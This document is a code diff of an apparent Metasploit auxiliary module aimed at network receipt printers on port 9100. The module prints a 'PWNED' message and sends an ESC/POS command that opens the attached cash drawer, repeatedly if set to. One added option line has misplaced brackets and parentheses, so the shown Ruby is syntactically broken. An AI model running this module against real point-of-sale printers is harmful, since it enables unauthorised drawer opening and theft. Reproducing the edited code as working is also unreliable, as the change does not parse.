@@ -1,3 +1,8 @@
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
 
@@ -25,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(9100),                                  # Default printer port
-        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']),
+        OptString.new('MESSAGE', [true, 'Message to print', 'PWNED']), conditions: %w[ACTION != DRAWER]),
         OptBool.new('TRIGGER_DRAWER', [false, 'Trigger the attached cash drawer', false]),
         OptInt.new('DRAWER_COUNT', [true, 'Number of times to trigger the drawer', 2])
       ]
@@ -33,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   # ESC/POS command to trigger the cash drawer
-  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32"
+  DRAWER_COMMAND = "\x1b\x70\x00\x19\x32".freeze
 
   def run
     rhost_ip = rhost
